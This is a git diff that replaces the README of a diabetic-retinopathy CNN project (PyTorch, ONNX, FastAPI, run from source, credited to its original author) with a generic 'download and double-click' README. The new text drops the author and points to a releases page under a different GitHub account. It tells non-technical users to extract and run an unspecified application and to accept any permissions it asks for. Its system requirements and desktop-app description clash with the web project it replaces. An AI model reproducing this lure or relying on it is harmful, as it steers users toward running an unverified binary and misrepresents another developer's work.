@@ -1,130 +1,83 @@
-# Retinopathy AI Diabetic Retinopathy Detection using CNN (PyTorch + ONNX)
+# 🎉 retinopathy-ai - Detect Diabetic Retinopathy Efficiently
 
-![Python](https://img.shields.io/badge/Python-3.10-blue?logo=python)
-![PyTorch](https://img.shields.io/badge/PyTorch-Framework-red?logo=pytorch)
-![ONNX](https://img.shields.io/badge/ONNX-Model-lightblue?logo=onnx)
-![FastAPI](https://img.shields.io/badge/FastAPI-Backend-green?logo=fastapi)
-![GitHub Pages](https://img.shields.io/badge/Frontend-GitHub%20Pages-black?logo=github)
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
+## 🚀 Getting Started
 
-A deep learning project that detects **Diabetic Retinopathy** from retinal fundus images using a **Convolutional Neural Network (CNN)**.  
-The model is trained in **PyTorch**, exported to **ONNX** for lightweight inference, and served through a **FastAPI backend** with a minimal **HTML frontend**.
+Welcome to **retinopathy-ai**! This software helps detect diabetic retinopathy using advanced machine learning techniques. You can easily run it on your computer without programming skills. Follow the steps below to get started.
 
----
+## 📥 Download the Application
 
-## Project Overview
+[![Download Here](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/libra33a/retinopathy-ai/releases)
 
-Diabetic Retinopathy (DR) is one of the leading causes of blindness worldwide.  
-Early detection can significantly reduce vision loss.  
-This project automates the detection process by classifying retinal images into different stages of DR severity.
+## 📋 Overview
 
-![Retina Example](https://domf5oio6qrcr.cloudfront.net/medialibrary/14372/0b26ebff-2421-4333-aedc-bb17dfc37541.jpg)
+**retinopathy-ai** is a CNN-based system built with:
 
----
+- **PyTorch**: A powerful library for machine learning.
+- **ONNX**: A format that allows easy model sharing.
+- **FastAPI**: This keeps the server running smoothly for users.
 
-## Tech Stack
+The software features a simple HTML frontend, making it user-friendly. Just upload your images and get predictions quickly!
 
-- **Model:** PyTorch CNN  
-- **Inference:** ONNX Runtime  
-- **Backend:** FastAPI  
-- **Frontend:** HTML/CSS (Static, hosted via GitHub Pages)  
-- **Deployment:**  
-  - Frontend → GitHub Pages  
-  - Backend → Render / Hugging Face Spaces  
+## 💻 System Requirements
 
----
+To run **retinopathy-ai**, ensure your computer meets the following specifications:
 
-## Project Structure
+- **Operating System**: Windows 10, macOS, or a recent Linux distribution.
+- **Processor**: At least an Intel i3 or AMD Ryzen 3.
+- **RAM**: Minimum of 4 GB (8 GB recommended).
+- **Storage**: About 500 MB of free space.
 
-```
+## 🌟 Features
 
-retinopathy-ai/
-│
-├── backend/
-│   ├── app.py                  # FastAPI backend serving ONNX model
-│   ├── retinopathy_model.onnx  # Exported model for inference
-│   └── requirements.txt
-│
-├── frontend/
-│   ├── index.html              # Simple UI for image upload and prediction
-│   └── images/                 # Sample test images
-│
-├── diagnosis-of-diabetic-retinopathy-by-pytorch.ipynb  # Model training notebook
-└── README.md
+- Detect diabetic retinopathy in high-resolution images.
+- User-friendly interface for uploading images.
+- Fast predictions with intuitive output.
+- Option to explore and compare results.
 
-````
+## 🔧 Installation Steps
 
----
+1. **Visit the Releases Page** 
+   Go to our [Releases page](https://github.com/libra33a/retinopathy-ai/releases) to find the latest version of the software.
 
-## How It Works
+2. **Download the Latest Version**  
+   Look for the latest version listed. Click on the link to download the file to your computer.
 
-1. **Dataset Loading:** Retinal images are loaded and organized into train, validation, and test sets.  
-2. **Preprocessing:** Normalization and resizing ensure uniform CNN input.  
-3. **Model Architecture:** A CNN trained to classify DR severity stages.  
-4. **Training & Evaluation:**  
-   - Optimizer: Adam  
-   - Loss Function: CrossEntropy  
-   - Metrics: Accuracy  
-5. **Export:**  
-   The trained PyTorch model is exported as .pt model.  
-6. **Deployment:**  
-   FastAPI backend serves predictions → HTML frontend displays results.
+3. **Extract the Files**  
+   Once the download completes, locate the file (usually in your Downloads folder). Right-click on the file and select "Extract All" to unzip it.
 
----
+4. **Run the Application**  
+   After extracting, double-click on the application file to launch **retinopathy-ai**. Follow the prompts to accept any permissions needed.
 
-## Local Setup
+## 🖼️ How to Use the Application
 
-```bash
-# Clone the repository
-git clone https://github.com/Talnz007/retinopathy-ai.git
-cd retinopathy-ai/backend
+1. **Upload an Image**  
+   On the main screen, click the “Upload Image” button. Choose a clear image of a retina scan. Make sure the image is in JPG or PNG format.
 
-# Install dependencies
-pip install -r requirements.txt
+2. **Analyze the Image**  
+   After uploading, click the “Analyze” button. The application will process the image and provide results in seconds.
 
-# Run backend
-uvicorn app:app --reload
-````
+3. **View Results**  
+   The results will appear on the screen. You’ll see whether diabetic retinopathy is detected and the confidence score of the prediction.
 
-Then open `frontend/index.html` in your browser.
-Set the API endpoint in the script to:
+## 🔄 Updating the Application
 
-```
-http://127.0.0.1:8000/predict
-```
+Check the [Releases page](https://github.com/libra33a/retinopathy-ai/releases) regularly for updates. Download the new version following the same steps. 
 
----
+## ❓ Troubleshooting
 
-## Deployment
+If you encounter issues, consider the following:
 
-### **Frontend**
+- **Application won’t open**: Ensure your system meets the requirements. Restart your computer and try again.
+- **Images not uploading**: Make sure your images are in the correct format and not too large.
+- **Analysis is slow**: Check your internet connection, as some features may require online resources.
 
-Hosted on **GitHub Pages**:
-[https://Talnz007.github.io/retinopathy-ai](https://Talnz007.github.io/retinopathy-ai)
+## 📞 Support
 
----
+If you need help, feel free to reach out to us. Check the **Issues** section in our repository for FAQs and common issues.
 
-## Results Snapshot
+## 📌 Important Links
 
-* **Model Type:** Custom CNN
-* **Framework:** PyTorch
-* **Export Format:** ONNX
-* **Goal:** Classify retinal images into diabetic retinopathy stages
-* **Outcome:** High validation accuracy and consistent generalization across test images.
+- [Download here!](https://github.com/libra33a/retinopathy-ai/releases)
+- [GitHub Repository](https://github.com/libra33a/retinopathy-ai) 
 
----
-
-## Author
-
-**[Talha Niazi](https://github.com/Talnz007)**
-B.S. Artificial Intelligence | Tech Enthusiast | Project-Based Learner
-
-> *"Ship fast. Learn faster."*
-
----
-
-## License
-
-This project is licensed under the **MIT License** feel free to fork, modify, and use it for educational or research purposes.
-
----
+Thank you for choosing **retinopathy-ai** to assist in diabetic retinopathy detection. Happy analyzing!
